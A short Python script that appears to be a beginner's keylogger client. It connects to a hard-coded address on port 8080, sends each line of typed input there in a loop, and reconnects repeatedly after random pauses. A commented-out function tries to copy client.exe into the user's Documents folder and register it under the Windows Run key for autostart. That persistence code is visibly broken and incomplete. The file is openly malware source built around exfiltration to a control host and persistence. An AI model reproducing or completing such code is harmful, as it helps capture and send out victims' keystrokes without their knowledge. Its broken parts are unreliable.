import socket
import os
import subprocess
import time
import shutil
import random

"""
def persistance():
	path = os.getcwd().strip('/n')
	Null, userprof = subprocess.check_output('set USERPROFILE', shell=True,stdin=subprocess.PIPE,  stderr=subprocess.PIPE).decode().split('=')
	
	destination = userprof.strip('\n\r') + '\\Documents\\' + 'client.exe'
	
#First time
	if not os.path.exists(destination):
		if not os.path.exists(path):
			os.mkdir(path)
		shutil.copyfile(path+'\client.exe', destination)
		key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
		wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS
		key.Close()
"""		
def connecting():
	s = socket.socket()
	print("Trying to connect")
	s.connect(("192.168.88.128", 8080))
	print("Connected")
	
	while True:
		try:
			print("Starting Keylog...")
			text = input().encode()
			while True:
				s.send(text)
				text = input().encode()
		except KeyboardInterrupt:
			print("[!] Programa was terminated")
			s.close()
			break

def main():
#	persistance()
	while True:
		try:
			connecting()
		except:
			sleep_for = random.randrange(1,10) #Sleep
			time.sleep(int(sleep_for))
main()
